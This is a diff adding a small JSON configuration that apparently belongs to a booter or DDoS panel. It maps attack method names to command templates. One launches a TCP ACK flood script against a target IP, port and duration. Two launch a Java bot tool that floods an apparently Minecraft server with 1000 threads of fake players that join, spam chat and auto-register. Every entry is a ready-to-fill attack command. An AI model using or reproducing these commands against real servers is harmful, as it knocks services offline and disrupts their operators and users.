@@ -1,0 +1,5 @@
+{
+    "crash-exp": "node files/tcp-ack.js ${ip} ${port} ${time} 65535 180",
+    "join-ping": "java -jar files/method.jar -move true -ping false -pingamount 10 -host ${ip} -port ${port} -threads 1000 -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol 340 -msg ExtremeAegis -amount 600 -proxymode NONE -login \"/login qwert1234\" -register \"/register qwert1234 qwert1234\" -time ${time} -debug true",
+    "nullping": "java -jar files/method.jar -move true -ping false -pingamount 10 -host ${ip} -port ${port} -threads 1000 -nicksize 50 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol 340 -msg ExtremeAegis -amount 600 -proxymode NONE -login \"/login qwert1234\" -register \"/register qwert1234 qwert1234\" -time ${time} -debug true"
+}
